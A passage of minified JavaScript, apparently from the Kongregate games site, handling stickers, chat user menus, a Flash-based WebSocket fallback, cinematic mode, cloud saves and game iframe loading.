this.recentStickersPrefix+this.activeUser.id()},loadRecentStickers:function(){this.recentStickers=$.jStorage.get(this.recentStickersKey())||[],this.pruneRecentStickers()},storeRecentStickers:function(){$.jStorage.set(this.recentStickersKey(),this.recentStickers)},clearRecentStickers:function(){this.recentStickers=[],this.storeRecentStickers(),this.loadRecentStickers()},pruneRecentStickers:function(){var e=this;for(this.recentStickers=this.recentStickers.filter((function(t){return e.isStickerOwned(t.id,t.variant)}));this.recentStickers.length>StickerManager.MAX_RECENT_STICKERS;)this.recentStickers.pop()},trackRecentSticker:function(e,t){this.recentStickers=this.recentStickers.filter((function(i){return i.id!==e||i.variant!==t})),this.recentStickers.unshift({id:e,variant:t}),this.pruneRecentStickers(),this.storeRecentStickers(),this.trigger("update-recent")},flushDailyActivityQueue:function(){if(this.activeUser.isAuthenticated()){var e=this;this.queuedDailyActivities.forEach((function(t){e.performDailyActivity(t)})),this.queuedDailyActivities=[]}},getTimestamp:function(){return+new Date}},$j.extend(StickerManager.prototype,Evented),SuggestionTemplate=function(e,t){this.initialize(e,t)},SuggestionTemplate.prototype={initialize:function(e,t){this._source=(e=$(e))?e.cloneNode(!0):void 0,this._substitutions=$H(t||{})},source:function(){return this._source?this._source.cloneNode(!0):void 0},substitutions:function(){return this._substitutions},insertAt:function(e){if(this.source()){var t=$(e);t&&(t.update(this.source()),this.substitutions().each((function(e){var i=e.value;(e=t.down(e.key))&&e.update(i)})))}}},UserRollover=function(e){this.initialize(e)},UserRollover.USER_TOP_FUDGE=9,UserRollover.BASE_LEFT_VALUE=54,UserRollover.prototype={initialize:function(e){if(this._chat_window=e,this._rollover_template_node=$("user_rollover_template"),this._gamelink_node=$("rollover_game_link"),this._profile_node=$("rollover_profile_link"),this._add_friend_node=$("rollover_add_friend_link"),this._private_message_node=$("rollover_private_message_link"),this._private_room_invite_node=$("rollover_private_room_invite_link"),this._private_room_kick_node=$("rollover_private_room_kick_link"),this._mute_node=$("rollover_mute_link"),this._add_friend_observer=function(){},this._profile_observer=function(){},this._private_message_observer=function(){},this._mute_observer=function(){},this._rollover_template_node){var t=this;this._rollover_template_node.observe("mouseover",(function(e){t.stopHide(),Event.stop(e)})),this._rollover_template_node.observe("mouseout",(function(e){t.beginHide(),Event.stop(e)}))}},show:function(e,t){this._hideTimer&&clearTimeout(this._hideTimer),this.updateCurrentGame(e),this.updateProfileLink(e),this.updateAddFriendLink(e.username),this.updatePrivateMessageLink(e.username),this.updatePrivateRoomInviteLink(e.username),this.updatePrivateRoomKickLink(e.username),this.updateMutingLink(e.username),this.toggleApplicableLinks(e),this.setRolloverPosition(t),this._rollover_template_node.show()},setRolloverPosition:function(e){var t=this._chat_window.activeRoomUserListScrollTop(),i=e.positionedOffset(),n=i[0],s=i[1];i=s-=UserRollover.USER_TOP_FUDGE,t<s&&(i=s-t),e=e.getWidth(),this._rollover_template_node.setStyle({left:n+e+"px",top:i+"px"})},updateCurrentGame:function(e){e.gameTitle()?(this._gamelink_node.up().show(),this._gamelink_node.writeAttribute("href",e.gameUrl()),this._gamelink_node.update(e.gameTitle())):this._gamelink_node.up().hide()},updateAddFriendLink:function(e){this._chat_window.username(),this._chat_window.isFriend(e)?this._add_friend_node.hide():(this._add_friend_node.update("Add Friend"),this._add_friend_node.stopObserving("click",this._add_friend_observer),this._add_friend_observer=CapturesToInlineRegistration.decorate(function(t){Element.show("add_as_friend_indicator");var i="/accounts/"+this._chat_window.username()+"/friends/"+e+"?friend_from=chat";return new Ajax.Request(i,{asynchronous:!0,evalScripts:!0,method:"put"}),Event.stop(t),!1}.bind(this)),this._add_friend_node.observe("click",this._add_friend_observer),this._add_friend_node.show())},updatePrivateMessageLink:function(e){var t=this._chat_window;this._private_message_node.stopObserving("click",this._private_message_observer),this._private_message_observer=CapturesToInlineRegistration.decorate(function(i){return t.insertPrivateMessagePrefixFor(e),Event.stop(i),!1}.bind(this)),this._private_message_node.observe("click",this._private_message_observer)},updatePrivateRoomInviteLink:function(e){var t=this._private_room_invite_node,i=this._chat_window.roomByType("private");i&&i.isMyPrivateRoom()&&i.user(e)?t.hide():(t.show(),holodeck.hasInvited(e)?(t.down(".invite").hide(),t.down(".retry").show()):(t.down(".invite").show(),t.down(".retry").hide())),t.stopObserving("click"),t.observe("click",(function(i){return t.down(".invite").hide(),t.down(".retry").show(),holodeck.sendPrivateRoomInvitation(e),Event.stop(i),!1}))},updatePrivateRoomKickLink:function(e){var t=this._chat_window._active_room,i=this._private_room_kick_node,n=this;t.isPrivate()&&t.isMyPrivateRoom()?(i.show(),i.stopObserving("click"),i.observe("click",(function(t){return holodeck.privateRoomKick(e),n.hide(),Event.stop(t),!1}))):i.hide()},updateMutingLink:function(e){var t;if(this._chat_window.isAdmin(e))this._mute_node.hide();else{this._mute_node.show();var i=e.match(/^_/),n=this._chat_window.username();this._chat_window.isMuted(e)?(this._mute_node.update("Unmute"),this._mute_node.stopObserving("click",this._mute_observer),this._mute_observer=function(s){return i?(holodeck.removeMuting(e),LocalMuteService.unmute(e)):(Element.show("muting_indicator"),t="/accounts/"+n+"/muted_users/"+e+"?from_chat=true",new Ajax.Request(t,{asynchronous:!0,evalScripts:!0,method:"delete"})),Event.stop(s),!1}):(this._mute_node.update("Mute"),this._mute_node.stopObserving("click",this._mute_observer),this._mute_observer=CapturesToInlineRegistration.decorate(function(s){return i?(holodeck.addMuting(e),LocalMuteService.mute(e)):(t="/accounts/"+n+"/muted_users?username="+e+"&from_chat=true",Element.show("muting_indicator"),new Ajax.Request(t,{asynchronous:!0,evalScripts:!0,method:"post"})),Event.stop(s),!1}.bind(this))),this._mute_node.observe("click",this._mute_observer)}},updateProfileLink:function(e){var t=this._chat_window,i=this;this._profile_node.stopObserving("click",this._profile_observer),this._profile_observer=function(n){return i.hide(),t.showProfile(e.username),Event.stop(n),!1},this._profile_node.observe("click",this._profile_observer)},beginHide:function(){var e=this;this._hideTimer&&clearTimeout(this._hideTimer),this._hideTimer=setTimeout((function(){e.hide()}),500)},stopHide:function(){clearTimeout(this._hideTimer)},hide:function(){this._rollover_template_node.hide()},toggleApplicableLinks:function(e){e.isGuest()?(this._private_room_invite_node.hide(),this._private_message_node.hide(),this._profile_node.hide(),this._add_friend_node.hide()):(e.isMobile()?(this._private_room_invite_node.hide(),this._private_message_node.hide()):(this._private_room_invite_node.show(),this._private_message_node.show()),this._profile_node.show())}},window.WEB_SOCKET_DEBUG=!1,window.WEB_SOCKET_SWF_LOCATION="https://assets.kongregate.com/flash/WebSocketMain.swf",window.WEB_SOCKET_SUPPRESS_CROSS_DOMAIN_SWF_ERROR=!0,function(){if(!window.WEB_SOCKET_FORCE_FLASH){if(window.WebSocket)return;if(window.MozWebSocket)return void(window.WebSocket=MozWebSocket)}var e=window.WEB_SOCKET_LOGGER?WEB_SOCKET_LOGGER:window.console&&window.console.log&&window.console.error?window.console:{log:function(){},error:function(){}};10>swfobject.getFlashPlayerVersion().major?e.error("Flash Player >= 10.0.0 is required."):("file:"==location.protocol&&e.error("WARNING: web-socket-js doesn't work in file:///... URL unless you set Flash Security Settings properly. Open the page via Web server i.e. http://..."),window.WebSocket=function(e,t,i,n,s){var o=this;o.__id=WebSocket.__nextId++,WebSocket.__instances[o.__id]=o,o.readyState=WebSocket.CONNECTING,o.bufferedAmount=0,o.__events={},t?"string"==typeof t&&(t=[t]):t=[],o.__createTask=setTimeout((function(){WebSocket.__addTask((function(){o.__createTask=null,WebSocket.__flash.create(o.__id,e,t,i||null,n||0,s||null)}))}),0)},WebSocket.prototype.send=function(e){if(this.readyState==WebSocket.CONNECTING)throw"INVALID_STATE_ERR: Web Socket connection has not been established";return 0>(e=WebSocket.__flash.send(this.__id,encodeURIComponent(e)))||(this.bufferedAmount+=e,!1)},WebSocket.prototype.close=function(){this.__createTask?(clearTimeout(this.__createTask),this.__createTask=null,this.readyState=WebSocket.CLOSED):this.readyState!=WebSocket.CLOSED&&this.readyState!=WebSocket.CLOSING&&(this.readyState=WebSocket.CLOSING,WebSocket.__flash.close(this.__id))},WebSocket.prototype.addEventListener=function(e,t,i){e in this.__events||(this.__events[e]=[]),this.__events[e].push(t)},WebSocket.prototype.removeEventListener=function(e,t,i){if(e in this.__events)for(i=(e=this.__events[e]).length-1;0<=i;--i)if(e[i]===t){e.splice(i,1);break}},WebSocket.prototype.dispatchEvent=function(e){for(var t=this.__events[e.type]||[],i=0;i<t.length;++i)t[i](e);(t=this["on"+e.type])&&t.apply(this,[e])},WebSocket.prototype.__handleEvent=function(e){if("readyState"in e&&(this.readyState=e.readyState),"protocol"in e&&(this.protocol=e.protocol),"open"==e.type||"error"==e.type)var t=this.__createSimpleEvent(e.type);else if("close"==e.type)(t=this.__createSimpleEvent("close")).wasClean=!!e.wasClean,t.code=e.code,t.reason=e.reason;else{if("message"!=e.type)throw"unknown event type: "+e.type;e=decodeURIComponent(e.message),t=this.__createMessageEvent("message",e)}this.dispatchEvent(t)},WebSocket.prototype.__createSimpleEvent=function(e){if(document.createEvent&&window.Event){var t=document.createEvent("Event");return t.initEvent(e,!1,!1),t}return{type:e,bubbles:!1,cancelable:!1}},WebSocket.prototype.__createMessageEvent=function(e,t){return window.MessageEvent&&"function"==typeof MessageEvent&&!window.opera?new MessageEvent("message",{view:window,bubbles:!1,cancelable:!1,data:t}):document.createEvent&&window.MessageEvent&&!window.opera?((e=document.createEvent("MessageEvent")).initMessageEvent("message",!1,!1,t,null,null,window,null),e):{type:e,data:t,bubbles:!1,cancelable:!1}},WebSocket.CONNECTING=0,WebSocket.OPEN=1,WebSocket.CLOSING=2,WebSocket.CLOSED=3,WebSocket.__isFlashImplementation=!0,WebSocket.__initialized=!1,WebSocket.__flash=null,WebSocket.__instances={},WebSocket.__tasks=[],WebSocket.__nextId=0,WebSocket.loadFlashPolicyFile=function(e){WebSocket.__addTask((function(){WebSocket.__flash.loadManualPolicyFile(e)}))},WebSocket.__initialize=function(){if(!WebSocket.__initialized)if(WebSocket.__initialized=!0,WebSocket.__swfLocation&&(window.WEB_SOCKET_SWF_LOCATION=WebSocket.__swfLocation),window.WEB_SOCKET_SWF_LOCATION){if(!window.WEB_SOCKET_SUPPRESS_CROSS_DOMAIN_SWF_ERROR&&!WEB_SOCKET_SWF_LOCATION.match(/(^|\/)WebSocketMainInsecure\.swf(\?.*)?$/)&&WEB_SOCKET_SWF_LOCATION.match(/^\w+:\/\/([^\/]+)/)){var t=RegExp.$1;location.host!=t&&e.error("[WebSocket] You must host HTML and WebSocketMain.swf in the same host ('"+location.host+"' != '"+t+"'). See also 'How to host HTML file and SWF file in different domains' section in README.md. If you use WebSocketMainInsecure.swf, you can suppress this message by WEB_SOCKET_SUPPRESS_CROSS_DOMAIN_SWF_ERROR = true;")}(t=document.createElement("div")).id="webSocketContainer",t.style.position="absolute",WebSocket.__isFlashLite()?(t.style.left="0px",t.style.top="0px"):(t.style.left="-100px",t.style.top="-100px");var i=document.createElement("div");i.id="webSocketFlash",t.appendChild(i),document.body.appendChild(t),swfobject.embedSWF(WEB_SOCKET_SWF_LOCATION,"webSocketFlash","1","1","10.0.0",null,null,{hasPriority:!0,swliveconnect:!0,allowScriptAccess:"always"},null,(function(t){t.success||e.error("[WebSocket] swfobject.embedSWF failed")}))}else e.error("[WebSocket] set WEB_SOCKET_SWF_LOCATION to location of WebSocketMain.swf")},WebSocket.__onFlashInitialized=function(){setTimeout((function(){WebSocket.__flash=document.getElementById("webSocketFlash"),WebSocket.__flash.setCallerUrl(location.href),WebSocket.__flash.setDebug(!!window.WEB_SOCKET_DEBUG);for(var e=0;e<WebSocket.__tasks.length;++e)WebSocket.__tasks[e]();WebSocket.__tasks=[]}),0)},WebSocket.__onFlashEvent=function(){return setTimeout((function(){try{for(var t=WebSocket.__flash.receiveEvents(),i=0;i<t.length;++i)WebSocket.__instances[t[i].webSocketId].__handleEvent(t[i])}catch(t){e.error(t)}}),0),!0},WebSocket.__log=function(t){e.log(decodeURIComponent(t))},WebSocket.__error=function(t){e.error(decodeURIComponent(t))},WebSocket.__addTask=function(e){WebSocket.__flash?e():WebSocket.__tasks.push(e)},WebSocket.__isFlashLite=function(){if(!window.navigator||!window.navigator.mimeTypes)return!1;var e=window.navigator.mimeTypes["application/x-shockwave-flash"];return!!(e&&e.enabledPlugin&&e.enabledPlugin.filename)&&!!e.enabledPlugin.filename.match(/flashlite/i)},window.WEB_SOCKET_DISABLE_AUTO_INITIALIZATION||swfobject.addDomLoadEvent((function(){WebSocket.__initialize()})))}();var GameBelowFoldHighScores={isSetup:!1,setup:function(){this.isSetup||($j("#highscoresholder").on("change","#stat_selector",(function(e){e.preventDefault(),e=$j(this).val(),GameBelowFoldHighScores.updateScores(e,1,"today_page")})),$j("#highscoresholder").on("click",".js-high-scores-paginate",(function(e){e.preventDefault();var t=$j(this);e=t.data("statistic-id");var i=t.data("page");t=t.data("page-param"),GameBelowFoldHighScores.updateScores(e,i,t)})),$j("#highscoresholder").on("click",".tab_title.dormant",(function(e){e.preventDefault(),$j("#highscoresholder dd.tab_box").html('<span class="spinner spinner_big">Loading...</span>'),GameBelowFoldHighScores.updateScores($j("#stat_selector").val(),1,$j(e.currentTarget).data("tab")+"_page")})),this.isSetup=!0)},updateScores:function(e,t,i){(e={game_id:active_user.gameId(),statistic_id:e,page_param:i})[i]=t,$j.get("/high_scores/game_below_fold",e,(function(e){$j("#highscoresholder").html(e)}))}},GameBelowFoldStickerPack={updateStickerPack:function(){var e={game_id:active_user.gameId()};(holderElement=$j("#sticker_pack_holder"))&&$j.get("/stickers/game_below_fold",e,(function(e){e&&($j("#sticker_pack_holder").html(e),document.querySelector(".game_sticker_packs").classList.add("is-visible"),holodeck.showStickerPackLink())}))}},CinematicMode={initialize:function(e){this._disallow_cinematic_scaling=e,this._cinematic_mode_active=this._hooked_up_cinematic_mode_link=!1,this._suppress_room_not_found=null,this._showingCinematicMessage=!1,this._cinematic_messages=[],this._game_standard_layout=null},hookUpCinematicQuicklink:function(){this._hooked_up_cinematic_mode_link||($("cinematic_mode_link").removeClassName("disabled"),$("cinematic_mode_link").observe("click",(function(e){e.stop(),CinematicMode.activateCinematicMode()})),this._hooked_up_cinematic_mode_link=!0)},isInCinematicMode:function(){return $("play").hasClassName("cinematic_mode")},addCinematicMessage:function(e){this.isInCinematicMode()&&($("cinematic_close_link").addClassName("alt"),this._cinematic_messages.push(e),this.showNextCinematicMessage())},gameElement:function(){return $("gamediv")||$("gameiframe")},gameWrapper:function(){return $("game_wrapper")||$("gameiframe")},showNextCinematicMessage:function(){if(!this._showingCinematicMessage&&0<this._cinematic_messages.length){this._showingCinematicMessage=!0;var e=CinematicMode._cinematic_messages.shift();$("game").insert('<p id="overlay_message" class="cinematic_alert" style="opacity:0;"><span class="spritegame cinematic_alert_ico mrm"></span><span class="cinematic_alert_text">'+e+"</span></p>"),$("overlay_message").fade({duration:2,from:0,to:1,afterFinish:function(){setTimeout((function(){$("overlay_message").fade({duration:2,from:1,to:0,afterFinish:function(){$("overlay_message")&&($("overlay_message").remove(),$("cinematic_close_link").removeClassName("alt")),CinematicMode._showingCinematicMessage=!1,CinematicMode.showNextCinematicMessage()}})}),3e4)}}),this.refreshCinematicLayout()}},activateCinematicMode:function(){if(!this._cinematic_mode_active)if(active_user.isAuthenticated()){holodeck.recordAnalyticsEvent("CinematicMode","Enter");var e=$("play");e.addClassName("cinematic_mode"),e.insert({top:new Element("div").addClassName("cinematic_overlay")}),$("cinematic_close_link").show(),document.viewport.getDimensions(),$("game").getLayout(),110<$("game").cumulativeOffset()[1]&&($("play").hasClassName("premium_user")?$("game").setStyle({top:"50px"}):$("game").setStyle({top:"130px"})),this._game_standard_layout=this.gameWrapper().getLayout(),$("cinematic_close_container").setStyle({width:this._game_standard_layout.get("width")+"px"}),Event.observe(document,"click",this.handleClickInCinematicMode),window.scrollTo(0,0),Event.observe(window,"resize",this.refreshCinematicLayout),$$(".square_ad").each((function(e){e.hide()})),this._cinematic_mode_active=!0,this.refreshCinematicLayout()}else active_user.activateInlineLogin({from_upsell:"cinematic_mode"},!0)},deactivateCinematicMode:function(){if(this._cinematic_mode_active){if(holodeck.recordAnalyticsEvent("CinematicMode","Exit"),this._cinematic_mode_active=!1,Event.stopObserving(window,"resize",this.refreshCinematicLayout),Event.stopObserving(document,"click",this.deactivateCinematicMode),!CinematicMode._disallow_cinematic_scaling){var e=this._game_standard_layout;this.gameWrapper().setStyle({width:e.get("width")+"px",height:e.get("height")+"px"}),$("cinematic_close_container").setStyle({width:e.get("width")+"px"})}$("play").removeClassName("cinematic_mode"),$("cinematic_close_link").hide(),$$(".cinematic_overlay").each(Element.remove),$("play").removeClassName("cinematic_small"),$$(".square_ad").each((function(e){e.show()})),$("game").setStyle({left:"",top:"",width:this._game_standard_layout.get("width")+"px"})}this._cinematic_messages=[],$("cinematic_close_link").removeClassName("alt"),$("overlay_message")&&$("overlay_message").remove(),$("play").removeClassName("cinematic_mode"),$("cinematic_close_link").hide(),$$(".cinematic_overlay").each(Element.remove),$$(".square_ad").each((function(e){e.show()}))},handleClickInCinematicMode:function(e){if(!e.findElement("#gamediv")&&!e.findElement("#gameiframe")){var t=CinematicMode,i=t.gameWrapper(),n=i.getDimensions();i=i.cumulativeOffset();var s=e.pointerX();e=e.pointerY(),s>i.left-30&&s<i.left+n.width+30&&e>i.top-30&&e<i.top+n.height+30||t.deactivateCinematicMode()}},refreshCinematicLayout:function(){var e=CinematicMode;if(e._cinematic_mode_active){if(!e._disallow_cinematic_scaling){var t=50;$("play").hasClassName("premium_user")&&(t=80);var i=e._game_standard_layout,n=i.get("width")/i.get("height"),s=document.viewport.getWidth()-110,o=s/n,a=e.gameElement().viewportOffset();o+a.top+t>document.viewport.getHeight()&&(s=(o=document.viewport.getHeight()-a.top-t)*n),s<i.get("width")&&(s=i.get("width"),o=i.get("height")),e.gameWrapper().setStyle({width:s.toFixed()+"px",height:o.toFixed()+"px"})}t=(e=$("gamediv")||$("gameiframe")).getWidth()+60,$("cinematic_close_container").setStyle({width:t+"px"}),$("game").setStyle({width:t+"px"}),e=(document.viewport.getWidth()-e.getWidth()-60)/2,t=document.viewport.getDimensions().height,$("game").setStyle({left:Math.max(0,e)+"px"}),t>$("game").getHeight()+129||$("play").hasClassName("premium_user")&&t>$("game").getHeight()+39?$("play").hasClassName("cinematic_small")||$("play").addClassName("cinematic_small"):$("play").hasClassName("cinematic_small")&&$("play").removeClassName("cinematic_small"),(e=$("overlay_message"))&&(t=$("cinematic_close_container").getWidth(),i=($("game").getWidth()-20-t)/2,e.setStyle({width:t+"px",left:i+"px"}))}}};KONGREGATE={},KONGREGATE.cloudSavesHandler=function(){var e,t={SYNC:"sync",REMOTE_ONLY:"remoteOnly",LOCAL_ONLY:"localOnly"},i={},n=[],s=[],o="gamediv";return{MODES:t,clearConfig:function(e){i={}},configure:function(e){$j.extend(i,e)},swf:function(){return $j("#"+o)[0]},setSwfObjectId:function(e){null!=e&&""!==e&&(o=e)},enterConflict:function(){i.mode===t.SYNC&&this.swf().enterConflict(),this.runConflictCallbacks()},addConflictCallback:function(e){s.push(e)},runConflictCallbacks:function(){$j.each(s,(function(e,t){setTimeout((function(){t()}),0)}))},readAllSyncedSharedObjectKeys:function(){return i.syncedSharedObjects.keys()},determineSyncMode:function(n,s,o,a){return e=s,i.mode?(this.runModeDeterminedCallbacks(i.mode,o),i.mode):i.enabled?(i.mode=n&&!s||o?t.LOCAL_ONLY:t.SYNC,this.runModeDeterminedCallbacks(i.mode,o),i.mode):(i.mode=t.LOCAL_ONLY,!this.getUserId()&&a&&this.runModeDeterminedCallbacks(i.mode,o,a),i.mode)},addModeDeterminedCallback:function(e){n.push(e)},runModeDeterminedCallbacks:function(e,t,i){$j.each(n,(function(n,s){setTimeout((function(){s(e,t,i)}),0)}))},getSyncMode:function(){return i.mode},getSyncedSharedObject:function(e){return i.syncedSharedObjects.get(e)},updateSyncedSharedObject:function(e,t){var n={};n[e]=t,i.syncedSharedObjects.processData({data:n,watermark:i.syncWatermark})},clearSyncedSharedObject:function(e){i.syncedSharedObjects.clear(e,i.syncWatermark)},getSyncedSharedObjectWatermark:function(){return i.syncWatermark},setSyncedSharedObjectWatermark:function(e){i.syncWatermark=e},getUserId:function(){return i.userId},getUsername:function(){return i.username},forceUpdates:function(){this.swf().resolveConflict(),i.syncedSharedObjects.forceUpdates()},zeroLocalMetadata:function(){this.swf().resolveConflict(),this.swf().zeroLocalMetadata()},touchLocalMetadata:function(){this.swf().touchLocalMetadata()},localWatermark:function(){return e},pollData:function(){return this.swf().pollData()},beginPolling:function(){setInterval(KONGREGATE.cloudSavesHandler.processData,Kongregate.SyncedSharedObjects.REQUEST_COOLDOWN_TIME)},processData:function(){i.syncedSharedObjects.processData(KONGREGATE.cloudSavesHandler.pollData())},flush:function(e){i.mode!==t.LOCAL_ONLY&&void 0!==i.syncedSharedObjects&&i.syncedSharedObjects.flush(KONGREGATE.cloudSavesHandler.pollData(),e)}}}(),function(){function e(){try{lightbox.prototype.deactivate()}catch(e){}}"undefined"!=typeof cloudSaves&&cloudSaves&&active_user.addRunWhenAuthenticatedObserver((function(t){t.isPremium()&&null===t.areCloudSavesEnabled()&&(lightbox.prototype.initializeKongregateLightboxFromAjax("/cloud_saves_preference/new",{done_class_name:"kred_purchase lightbox_login cloud_lb",afterStaticContentLoad:function(){$j(".js-cloud-saves-game-name").text(active_user.gameName())}}),$j(document).on("click",".js-cloud-saves-preference",(function(t){var i=(t=$j(t.target)).data("enabled");t.parent("p").html('<span class="spinner">Loading...</span>'),$j.ajax("/cloud_saves_preference",{type:"post",data:{cloud_saves_preference:{enabled:i}}}).done((function(){i?window.location.reload():e()})).fail((function(){e()}))})))}))}.runWhenReady();var GameIframe=function(e,t,i){active_user.forceSSLIframe()&&(Kongregate.Log.warn("Forcing SSL iframe"),e.iframe_url&&(e.iframe_url=e.iframe_url.replace(/^http:/,"https:")),e.iframe_host&&(e.iframe_host=e.iframe_host.replace(/^http:/,"https:"))),this.config=e,this.urlOptions=t,this.channelId=i};GameIframe.prototype.createGameIframeElement=function(){var e=new Element("iframe",{id:"gameiframe",name:"gameiframe",scrolling:"auto",loading:"lazy",border:0,frameborder:0,style:"width: "+this.config.game_width+"px; height: "+this.config.game_height+"px; position: absolute; top: "+this.config.game_top+"px; left: "+this.config.game_left+"px;"+this.config.style_updates,class:this.config.iframe_class,allowfullscreen:!this.config.max_game_height});if($("gameiframe").replace(e),this.getGameIframeUrl((function(t){e.contentWindow.location.replace(t)})),this.config.post_message){var t=function(t){t.origin===this.config.iframe_host&&"kongregate_request_params"===t.data&&(t={type:"params",data:this.iframeOptions()},Kongregate.PostMessage.supportsObjects()||(t=JSON.stringify(t)),e.contentWindow.postMessage(t,this.config.iframe_host))}.bind(this);Kongregate.PostMessage.addMessageListener(window,t)}this.config.max_game_width&&this.config.max_game_height&&(function(){this.setSizeToMaxForWindow()}.bind(this).runWhenGameLoaded(),document.observe("holodeck:ready",function(e){this.setSizeToMaxForWindow()}.bind(this)),$j(window).resize(function(e){this.setSizeToMaxForWindow()}.bind(this))),this.setupErrorListener()},GameIframe.prototype.getGameIframeUrl=function(e){var t=this,i=window.location.search.match(/forceWebPlayer/);unityObject.detectUnity((function(n){var s=t.config.iframe_url;n="installed"===n||"running"===n,"unity"===t.config.game_type&&(t.config.alternate_game_file_url&&!i?(s=t.config.alternate_game_file_url,t.config.iframe_host=s.split("/",3).join("/")):n||(s=window.location.protocol+"//"+window.location.host+window.location.pathname+"/browser_upsell",document.observe("holodeck:ready",(function(e){t.setSize(800,800)})))),t.config.post_message||(s+=0>s.indexOf("?")?"?":"&",s+=Object.toQueryString(t.iframeOptions())),e(s)}))},GameIframe.prototype.iframeOptions=function(){var e={DO_NOT_SHARE_THIS_LINK:1,kongregate_username:active_user.username(),kongregate_user_id:active_user.id(),kongregate_game_auth_token:active_user.gameAuthToken(),kongregate_game_id:this.config.game_id,kongregate_host:this.config.host,kongregate_game_url:this.config.game_url,kongregate_api_host:this.config.api_host,kongregate_channel_id:this.config.channel_id,kongregate_api_path:this.config.api_path,kongregate_ansible_path:this.config.ansible_path,kongregate_preview:this.config.preview,kongregate_game_version:this.config.game_version,kongregate_language:active_user.currentLocale().slice(0,2),preview:this.config.preview,kongregate_split_treatments:encodeURIComponent(active_user.gameSplitTreatments(this.config.game_permalink)),kongregate:!0,kongregate_svid:active_user.siteVisitorUID(),kongregate_analytics_mode:this.config.analytics_mode,kongregate_debug_level:active_user.debugLevel(),kongregate_js_api:!0,kongregate_flash_postmessage:active_user.flashPostMessageEnabled(),KEEP_THIS_DATA_PRIVATE:1},t=$H(location.search.toQueryParams()).merge(this.urlOptions.toQueryParams()).toObject();for(var i in"true"===String(this.config.auto_resize)&&(e.kongregate_auto_resize=!0),t)0!==i.indexOf("guest_access_key")&&0!==i.indexOf(this.config.flash_var_prefix)||(e[i]=t[i]);return e},GameIframe.prototype.setSizeToMaxForWindow=function(){this.setSize(Math.max(this.config.game_width,Math.min($j(window).width()-333,this.config.max_game_width)),Math.max(this.config.game_height,Math.min($j(window).height()-150,this.config.max_game_height)))},GameIframe.prototype.setSize=function(e,t){var i=["flashframecontent","maingamecontent","maingame"],n=["gameholder","game"],s=$("maingame");if(s){var o=s.getLayout(),a=$("gameiframe").getLayout();s=Math.max(620,e),o.get("width"),a.get("width"),a=o.get("height")-a.get("height"),o=Math.max(s+300,923);var r=t+a;for(a=null,(a=$("gameiframe")).style.width=e+"px",a.width=e,a.style.height=t+"px",a.height=t,e=0;e<n.length;e++)(a=$(n[e])).style.width=s+"px",a.width=s,a.style.height=t+"px",a.height=t;for(e=0;e<i.length;e++)(a=$(i[e])).style.width=o+"px",a.width=o,a.style.height=r+"px",a.height=r;(t=$("chat_container"))&&(t.style.height=r-26+"px",t.height=r-26),$$(".chat_message_window").each((function(e){e.style.height=r-283+"px",e.style["max-height"]=r-283+"px",e.height=r-283})),$$(".tabpane").each((function(e){e.style.height=r-66+"px",e.height=r-66}))}},GameIframe.prototype.setupErrorListener=function(){if("undefined"!=typeof metricTracker){var e=function(e){var t;"object"==typeof e.data&&(t=e.data.kongregateGameError)&&(metricTracker.trackEvent("GamePage","Error",t.type,null,!0),Kongregate.Log.warn("Game error reported",t))}.bind(this);Kongregate.PostMessage.addMessageListener(window,Kongregate.Utils.catchErrors(e,this))}},Kongregate.SyncedSharedObjects=function(e,t,i,n){function s(){r||m||(r=setTimeout((function(){r=null,o()}),Math.max(Kongregate.SyncedSharedObjects.REQUEST_WAIT_TIME,f-1e3*new Date)))}function o(){m=null,$j.extend(l,_),_={},f=Kongregate.SyncedSharedObjects.REQUEST_COOLDOWN_TIME+1e3*new Date,$j.ajax(e,{type:"POST",data:{updates:JSON.stringify(l),watermark:a,load_watermark:i,debug:n},beforeSend:function(){return $j.each(h,(function(e,t){setTimeout(t,0)})),!0},complete:function(e,t){var i="success"===t;return $j.each(d,(function(e,t){setTimeout((function(){t(i)}),0)})),!0},success:function(){$j.extend(c,l),l={},p=0,$j.isEmptyObject(_)||s()},error:function(e){409==e.status?($j.each(u,(function(e,t){setTimeout(t,0)})),p=0):401==e.status?p=0:(m=setTimeout(o,1e3*Math.pow(2,p)),p++)}})}var a,r,c=t||{},h=[],d=[],u=[],l={},_={},m=null,p=0,f=0,g=this;this.processData=function(e){a=e.watermark,$j.extend(_,e.data),$j.isEmptyObject(_)||s()},this.get=function(e){return c[e]},this.clear=function(e,t){delete c[e],clearData={},clearData[e]=null,g.processData({data:clearData,watermark:t})},this.flush=function(t,s){clearTimeout(r),clearTimeout(m),$j.extend(l,_),t&&($j.extend(l,t.data),a=t.watermark),_={},$j.isEmptyObject(l)?s&&s():$j.ajax(e,{type:"POST",async:!!s,data:{updates:JSON.stringify(l),watermark:a,load_watermark:i,debug:n},success:s})},this.keys=function(){var e=[];return $j.each(c,(function(t,i){e.push(t)})),e},this.retryCount=function(){return p},this.addSyncStartedCallback=function(e){h.push(e)},this.addSyncEndedCallback=function(e){d.push(e)},this.addConflictCallback=function(e){u.push(e)},this.forceUpdates=function(){a=i=+new Date,o()},this.hasActiveRetry=function(){return null!==m}},Kongregate.SyncedSharedObjects.REQUEST_WAIT_TIME=5e3,Kongregate.SyncedSharedObjects.REQUEST_COOLDOWN_TIME=6e4,Kongregate.GameLoader=function(e,t,i){function n(){"undefined"!=typeof active_user&&"function"==typeof active_user.areCloudSavesEnabled&&"undefined"!=typeof cloudSaves&&void 0!==cloudSaves.syncedSharedObjects&&active_user.areCloudSavesEnabled()&&!a&&(KONGREGATE.cloudSavesHandler.flush(),a=!0)}var s,o=!1,a=!1,r=this;KONGREGATE.cloudSavesHandler&&(void 0!==window.onbeforeunload?$j(window).on("beforeunload.cloud_saves",n):$j(window).on("unload.cloud_saves",n)),this.refreshCloudData=function(e){$j.ajax({url:t,success:function(t){cloudSaves=t,e()}})},this.loadGame=function(n){t&&"undefined"!=typeof cloudSaves&&(void 0!==cloudSaves.syncedSharedObjects?cloudSaves.syncedSharedObjects.constructor!==Kongregate.SyncedSharedObjects&&(s=new Kongregate.SyncedSharedObjects(t,cloudSaves.syncedSharedObjects,cloudSaves.loadWatermark,i),cloudSaves.syncedSharedObjects=s,s.addSyncStartedCallback(Kongregate.CloudSavesController.syncStarted.bind(Kongregate.CloudSavesController)),s.addSyncEndedCallback(Kongregate.CloudSavesController.syncEnded.bind(Kongregate.CloudSavesController)),s.addConflictCallback(KONGREGATE.cloudSavesHandler.enterConflict.bind(KONGREGATE.cloudSavesHandler))):(s=new 